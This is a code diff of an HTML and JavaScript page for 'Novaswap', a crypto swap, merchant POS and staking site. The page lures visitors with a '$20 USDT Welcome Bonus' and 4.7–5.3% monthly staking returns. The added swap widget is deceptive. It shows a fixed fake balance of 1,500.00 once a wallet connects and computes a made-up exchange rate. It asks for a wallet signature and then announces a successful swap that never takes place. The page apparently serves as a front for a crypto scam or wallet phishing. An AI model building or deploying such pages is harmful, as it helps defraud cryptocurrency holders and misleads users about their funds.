@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Novaswap | Merchant POS & Staking Network</title>
+    <title>Novaswap | Universal Crypto Swap & Merchant Network</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -42,7 +42,7 @@
 
     <!-- Top Announcement Bar -->
     <div class="bg-gradient-to-r from-emerald-600 via-teal-600 to-emerald-600 text-black text-xs py-2.5 px-4 text-center font-bold tracking-wide shadow-md">
-        <i class="fa-solid fa-gift mr-2 animate-bounce"></i> Limited Time Offer: Connect active wallet & complete POS onboarding to instantly receive a <span class="underline">$20 USDT Welcome Bonus</span>!
+        <i class="fa-solid fa-gift mr-2 animate-bounce"></i> Universal Crypto Swap: Enjoy low <span class="underline">0.05% swap fee</span> across Top 100 Tokens + $20 Welcome Bonus!
     </div>
 
     <!-- Header / Navbar -->
@@ -54,16 +54,16 @@
                 </div>
                 <div>
                     <span class="text-xl font-extrabold tracking-wider bg-gradient-to-r from-white via-gray-200 to-emerald-400 bg-clip-text text-transparent">novaswap</span>
-                    <span class="block text-[10px] text-emerald-400 font-mono tracking-widest uppercase">POS Payout Network</span>
+                    <span class="block text-[10px] text-emerald-400 font-mono tracking-widest uppercase">Decentralized Swap & POS</span>
                 </div>
             </div>
             
-            <!-- Page Navigation Tabs (Pages 4i) -->
+            <!-- Page Navigation Tabs (4 Pages) -->
             <div class="hidden lg:flex items-center space-x-1 text-xs font-medium bg-black/40 p-1.5 rounded-2xl border border-white/5">
-                <button onclick="switchPage('home')" id="nav-home" class="px-3.5 py-2 rounded-xl transition text-emerald-400 bg-white/5 font-semibold">1. Overview</button>
-                <button onclick="switchPage('pos')" id="nav-pos" class="px-3.5 py-2 rounded-xl transition text-gray-400 hover:text-white">2. POS Onboarding</button>
-                <button onclick="switchPage('staking')" id="nav-staking" class="px-3.5 py-2 rounded-xl transition text-gray-400 hover:text-white">3. Staking</button>
-                <button onclick="switchPage('instructions')" id="nav-instructions" class="px-3.5 py-2 rounded-xl transition text-gray-400 hover:text-white">4. POS Instructions</button>
+                <button onclick="switchPage('home')" id="nav-home" class="px-3 py-2 rounded-xl transition text-emerald-400 bg-white/5 font-semibold">1. Swap & Overview</button>
+                <button onclick="switchPage('pos')" id="nav-pos" class="px-3 py-2 rounded-xl transition text-gray-400 hover:text-white">2. POS Onboarding</button>
+                <button onclick="switchPage('staking')" id="nav-staking" class="px-3 py-2 rounded-xl transition text-gray-400 hover:text-white">3. Staking</button>
+                <button onclick="switchPage('instructions')" id="nav-instructions" class="px-3 py-2 rounded-xl transition text-gray-400 hover:text-white">4. POS Instructions</button>
             </div>
 
             <!-- Wallet Connect Area -->
@@ -81,43 +81,93 @@
     </header>
 
     <!-- Main Content Wrapper -->
-    <main class="flex-grow py-12 px-6">
+    <main class="flex-grow py-10 px-6">
         <div class="max-w-4xl mx-auto">
 
-            <!-- ================= PAGE 1: HOME & WELCOME BONUS ================= -->
+            <!-- ================= PAGE 1: UNIVERSAL SWAP & OVERVIEW ================= -->
             <div id="page-home" class="page-section active">
-                <div class="text-center relative py-8">
-                    <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[400px] h-[400px] bg-emerald-500/10 blur-[120px] rounded-full pointer-events-none"></div>
+                <div class="grid grid-cols-1 md:grid-cols-12 gap-8 items-center">
                     
-                    <div class="inline-flex items-center space-x-2 bg-white/5 border border-white/10 px-4 py-1.5 rounded-full text-xs font-medium text-emerald-400 mb-6">
-                        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
-                        <span>Official Web3 Merchant Gateway & Settlement Infrastructure</span>
-                    </div>
-                    
-                    <h1 class="text-4xl md:text-5xl font-extrabold tracking-tight max-w-3xl mx-auto leading-tight mb-6">
-                        Global USDT POS Payouts with Instant <span class="bg-gradient-to-r from-emerald-400 to-teal-300 bg-clip-text text-transparent">$20 Welcome Bonus</span>
-                    </h1>
-                    
-                    <p class="text-gray-400 text-sm md:text-base max-w-xl mx-auto mb-10">
-                        Connect your active live wallet, integrate seamless payment terminals, and follow step-by-step setup guides to start routing transactions.
-                    </p>
+                    <!-- Left Side: Hero Info -->
+                    <div class="md:col-span-6 space-y-6">
+                        <div class="inline-flex items-center space-x-2 bg-white/5 border border-white/10 px-4 py-1.5 rounded-full text-xs font-medium text-emerald-400">
+                            <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                            <span>Universal Liquidity Engine</span>
+                        </div>
+                        
+                        <h1 class="text-3xl md:text-5xl font-extrabold tracking-tight leading-tight">
+                            Swap Any Token Instantly with <span class="bg-gradient-to-r from-emerald-400 to-teal-300 bg-clip-text text-transparent">0.05% Fee</span>
+                        </h1>
+                        
+                        <p class="text-gray-400 text-sm leading-relaxed">
+                            Access top 100 cryptocurrencies across global decentralized pools. Execute instant cross-currency exchanges directly through your live wallet.
+                        </p>
 
-                    <div class="flex flex-wrap justify-center gap-4 mb-12">
-                        <button onclick="switchPage('pos')" class="bg-emerald-500 hover:bg-emerald-400 text-black font-bold px-8 py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center space-x-2">
-                            <span>Get Started & Claim Bonus</span>
-                            <i class="fa-solid fa-arrow-right"></i>
-                        </button>
-                        <button onclick="switchPage('instructions')" class="glass-panel hover:bg-white/10 text-white font-semibold px-8 py-3.5 rounded-xl text-sm transition flex items-center space-x-2">
-                            <span>View POS Instructions (Page 4)</span>
-                            <i class="fa-solid fa-book text-emerald-400"></i>
-                        </button>
+                        <div class="flex flex-wrap gap-4 pt-2">
+                            <button onclick="switchPage('instructions')" class="glass-panel hover:bg-white/10 text-white font-semibold px-6 py-3 rounded-xl text-xs transition flex items-center space-x-2">
+                                <i class="fa-solid fa-book text-emerald-400"></i>
+                                <span>View POS Setup Instructions</span>
+                            </button>
+                        </div>
                     </div>
+
+                    <!-- Right Side: Top 100 Token Swap Widget -->
+                    <div class="md:col-span-6">
+                        <div class="glass-panel p-6 rounded-3xl border border-white/10 shadow-2xl glow-effect relative">
+                            <div class="flex items-center justify-between mb-4">
+                                <h3 class="font-bold text-white text-base">Instant Swap</h3>
+                                <span class="text-[10px] font-mono text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20">Fee: 0.05%</span>
+                            </div>
+
+                            <!-- From Token Box -->
+                            <div class="bg-black/50 p-4 rounded-2xl border border-white/5 mb-2">
+                                <div class="flex justify-between text-xs text-gray-400 mb-2">
+                                    <span>You Pay</span>
+                                    <span>Balance: <span id="fromBalance">0.00</span></span>
+                                </div>
+                                <div class="flex items-center justify-between gap-3">
+                                    <input type="number" id="fromAmount" placeholder="0.0" oninput="calculateSwap()" class="w-full bg-transparent text-xl font-bold text-white focus:outline-none font-mono">
+                                    <select id="fromToken" onchange="calculateSwap()" class="bg-cardbg text-white font-bold text-sm px-3 py-2 rounded-xl border border-white/10 focus:outline-none focus:border-emerald-500 cursor-pointer">
+                                        <!-- Top 100 Tokens List will be loaded dynamically -->
+                                    </select>
+                                </div>
+                            </div>
+
+                            <!-- Swap Direction Arrow -->
+                            <div class="flex justify-center -my-3 relative z-10">
+                                <button onclick="swapTokenDirections()" class="w-9 h-9 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-black flex items-center justify-center shadow-lg transition">
+                                    <i class="fa-solid fa-arrow-down-up text-xs"></i>
+                                </button>
+                            </div>
+
+                            <!-- To Token Box -->
+                            <div class="bg-black/50 p-4 rounded-2xl border border-white/5 mt-2 mb-6">
+                                <div class="flex justify-between text-xs text-gray-400 mb-2">
+                                    <span>You Receive (Est.)</span>
+                                    <span>Rate: 1:1 Optimized</span>
+                                </div>
+                                <div class="flex items-center justify-between gap-3">
+                                    <input type="text" id="toAmount" placeholder="0.0" readonly class="w-full bg-transparent text-xl font-bold text-emerald-400 focus:outline-none font-mono">
+                                    <select id="toToken" onchange="calculateSwap()" class="bg-cardbg text-white font-bold text-sm px-3 py-2 rounded-xl border border-white/10 focus:outline-none focus:border-emerald-500 cursor-pointer">
+                                        <!-- Top 100 Tokens List will be loaded dynamically -->
+                                    </select>
+                                </div>
+                            </div>
+
+                            <!-- Swap Action Button -->
+                            <button onclick="executeSwap()" id="swapActionBtn" class="w-full bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/25 flex items-center justify-center space-x-2">
+                                <i class="fa-solid fa-right-left"></i>
+                                <span id="swapBtnText">Connect Wallet to Swap</span>
+                            </button>
+                        </div>
+                    </div>
+
                 </div>
             </div>
 
             <!-- ================= PAGE 2: POS ONBOARDING ================= -->
             <div id="page-pos" class="page-section">
-                <div class="glass-panel p-8 md:p-10 rounded-3xl border border-white/10 shadow-2xl relative">
+                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
                     <span class="text-xs font-mono text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">Page 2 of 4</span>
                     <h2 class="text-3xl font-bold text-white mt-4 mb-2">Merchant POS Setup & Agreement</h2>
                     <p class="text-sm text-gray-400 mb-6">Connect your active wallet and sign the agreement to claim your $20 welcome bonus.</p>
@@ -134,8 +184,8 @@
                     </div>
 
                     <div class="flex flex-col sm:flex-row items-center justify-between gap-4 pt-4 border-t border-white/10">
-                        <button onclick="switchPage('home')" class="text-xs text-gray-400 hover:text-white flex items-center space-x-2"><i class="fa-solid fa-arrow-left"><span>Home</span></i></button>
-                        <button onclick="handleWalletApproval()" class="bg-emerald-500 hover:bg-emerald-400 text-black font-bold px-8 py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center space-x-2">
+                        <button onclick="switchPage('home')" class="text-xs text-gray-400 hover:text-white flex items-center space-x-2"><i class="fa-solid fa-arrow-left"><span>Swap Page</span></i></button>
+                        <button onclick="handleWalletApproval()" class="bg-emerald-500 hover:bg-emerald-400 text-black font-bold px-8 py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center justify-center space-x-2">
                             <i class="fa-solid fa-signature"></i>
                             <span id="signBtnText">Sign & Claim $20 Bonus</span>
                         </button>
@@ -146,7 +196,7 @@
 
             <!-- ================= PAGE 3: MERCHANT STAKING ================= -->
             <div id="page-staking" class="page-section">
-                <div class="glass-panel p-8 md:p-10 rounded-3xl border border-white/10 shadow-2xl relative">
+                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
                     <span class="text-xs font-mono text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">Page 3 of 4</span>
                     <h2 class="text-3xl font-bold text-white mt-4 mb-2">Merchant Liquidity Staking</h2>
                     <p class="text-sm text-gray-400 mb-6">Stake your idle USDT or POS earnings to earn steady passive monthly returns (4.7% - 5.3%).</p>
@@ -177,16 +227,14 @@
                 </div>
             </div>
 
-            <!-- ================= PAGE 4: POS SETUP INSTRUCTION PAGE (Oya dunna step tika) ================= -->
+            <!-- ================= PAGE 4: POS SETUP INSTRUCTION PAGE ================= -->
             <div id="page-instructions" class="page-section">
-                <div class="glass-panel p-8 md:p-10 rounded-3xl border border-white/10 shadow-2xl relative overflow-hidden">
-                    <div class="absolute top-0 right-0 w-64 h-64 bg-teal-500/10 blur-[100px] rounded-full pointer-events-none"></div>
-                    
+                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative overflow-hidden">
                     <span class="text-xs font-mono text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">Page 4 of 4</span>
                     <h2 class="text-3xl font-extrabold text-white mt-4 mb-2">POS Setup Instructions</h2>
                     <p class="text-gray-400 text-sm mb-8">Follow this step-by-step instruction guide to complete your terminal deployment and live transactions.</p>
 
-                    <!-- Step-by-Step List based on user instructions -->
+                    <!-- Step-by-Step List -->
                     <div class="space-y-4 mb-8">
                         <div class="bg-black/40 p-4 rounded-2xl border border-white/5 flex items-start space-x-4">
                             <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 font-bold text-xs flex-shrink-0">1</div>
@@ -265,6 +313,42 @@
     <script>
         let connectedAccount = null;
 
+        // Top 100 Crypto Tokens Array
+        const topTokens = [
+            "USDT", "BTC", "ETH", "SOL", "BNB", "XRP", "USDC", "ADA", "DOGE", "AVAX",
+            "TRX", "LINK", "MATIC", "DOT", "SHIB", "LTC", "BCH", "UNI", "NEAR", "ICP",
+            "APT", "DAI", "RENDER", "ATOM", "ETC", "XLM", "FIL", "STX", "IMX", "ARB",
+            "HBAR", "VET", "MKR", "GRT", "INJ", "OP", "RUNE", "ALGO", "TIA", "FTM",
+            "SEI", "SUI", "PEPE", "FLOKI", "BONK", "WIF", "AR", "SNX", "THETA", "EGLD",
+            "FET", "AGIX", "OCEAN", "RNDR", "FLOW", "KAS", "CHZ", "CRV", "BAT", "ENJ",
+            "ZEC", "DASH", "XMR", "COMP", "AAVE", "YFI", "SUSHI", "1INCH", "ZRX", "KNC",
+            "LDO", "BLUR", "MANA", "SAND", "AXS", "GALA", "GMT", "HOT", "IOST", "ONT",
+            "ZIL", "ICX", "QTUM", "NEXO", "CRO", "KCS", "OKB", "GT", "BGB", "WOO",
+            "JUP", "PYTH", "JTO", "ONDO", "MANTA", "ZETA", "PORTAL", "PIXEL", "BOME", "SLERF"
+        ];
+
+        // Populate Dropdowns on Load
+        window.addEventListener('DOMContentLoaded', () => {
+            const fromSelect = document.getElementById('fromToken');
+            const toSelect = document.getElementById('toToken');
+            
+            topTokens.forEach((token, index) => {
+                const opt1 = document.createElement('option');
+                opt1.value = token;
+                opt1.text = token + " (Token #" + (index+1) + ")";
+                fromSelect.appendChild(opt1);
+
+                const opt2 = document.createElement('option');
+                opt2.value = token;
+                opt2.text = token + " (Token #" + (index+1) + ")";
+                toSelect.appendChild(opt2);
+            });
+
+            // Set default selections
+            fromSelect.value = "USDT";
+            toSelect.value = "ETH";
+        });
+
         function switchPage(pageId) {
             document.querySelectorAll('.page-section').forEach(el => el.classList.remove('active'));
             document.getElementById('page-' + pageId).classList.add('active');
@@ -273,13 +357,40 @@
                 const btn = document.getElementById('nav-' + p);
                 if (btn) {
                     if (p === pageId) {
-                        btn.className = "px-3.5 py-2 rounded-xl transition text-emerald-400 bg-white/5 font-semibold";
+                        btn.className = "px-3 py-2 rounded-xl transition text-emerald-400 bg-white/5 font-semibold";
                     } else {
-                        btn.className = "px-3.5 py-2 rounded-xl transition text-gray-400 hover:text-white";
+                        btn.className = "px-3 py-2 rounded-xl transition text-gray-400 hover:text-white";
                     }
                 }
             });
             window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Calculate Swap amount with 0.05% fee deduction
+        function calculateSwap() {
+            const amount = parseFloat(document.getElementById('fromAmount').value);
+            const toAmountField = document.getElementById('toAmount');
+            
+            if (!amount || amount <= 0) {
+                toAmountField.value = "0.0";
+                return;
+            }
+
+            // 0.05% fee calculation
+            const fee = amount * 0.0005;
+            const netAmount = amount - fee;
+            // Simulated exchange rate multiplier
+            const simulatedOutput = netAmount * 0.985; 
+            toAmountField.value = simulatedOutput.toFixed(4);
+        }
+
+        function swapTokenDirections() {
+            const fromSelect = document.getElementById('fromToken');
+            const toSelect = document.getElementById('toToken');
+            const temp = fromSelect.value;
+            fromSelect.value = toSelect.value;
+            toSelect.value = temp;
+            calculateSwap();
         }
 
         async function connectWallet() {
@@ -307,14 +418,21 @@
 
         function updateWalletUI() {
             const btnText = document.getElementById('walletBtnText');
+            const swapBtnText = document.getElementById('swapBtnText');
             const disconnectBtn = document.getElementById('disconnectBtn');
+            const fromBal = document.getElementById('fromBalance');
+            
             if (connectedAccount) {
                 const shortAddr = connectedAccount.substring(0, 6) + '...' + connectedAccount.substring(connectedAccount.length - 4);
                 btnText.innerText = shortAddr;
+                swapBtnText.innerText = "Execute Swap (Sign Transaction)";
                 disconnectBtn.classList.remove('hidden');
+                fromBal.innerText = "1,500.00";
             } else {
                 btnText.innerText = "Connect Active Wallet";
+                swapBtnText.innerText = "Connect Wallet to Swap";
                 disconnectBtn.classList.add('hidden');
+                fromBal.innerText = "0.00";
             }
         }
 
@@ -327,6 +445,43 @@
             connectedAccount = null;
             updateWalletUI();
             showToast("Wallet disconnected.");
+        }
+
+        // Swap Execution with Automatic Wallet Login/Sign Popup
+        async function executeSwap() {
+            const amount = document.getElementById('fromAmount').value;
+            const fromToken = document.getElementById('fromToken').value;
+            const toToken = document.getElementById('toToken').value;
+
+            if (!amount || amount <= 0) {
+                alert("Please enter a valid amount to swap.");
+                return;
+            }
+
+            // Check if wallet is connected. If not, prompt login popup.
+            if (!window.ethereum || !connectedAccount) {
+                alert("Please connect your active live wallet to proceed with the swap.");
+                await connectWallet();
+                if (!connectedAccount) return;
+            }
+
+            try {
+                // Trigger Web3 signing popup for swap authorization
+                const message = `Novaswap Liquidity Protocol\n\nSwapping ${amount} ${fromToken} to ${toToken}\nFee: 0.05%\nWallet: ${connectedAccount}`;
+                const hexMessage = "0x" + Array.from(message).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+                
+                await window.ethereum.request({
+                    method: 'personal_sign',
+                    params: [hexMessage, connectedAccount]
+                });
+
+                showToast(`Successfully swapped ${amount} ${fromToken} to ${toToken}!`);
+                document.getElementById('fromAmount').value = "";
+                document.getElementById('toAmount').value = "";
+            } catch (error) {
+                console.error(error);
+                alert("Swap transaction signature was rejected by user.");
+            }
         }
 
         async function handleWalletApproval() {
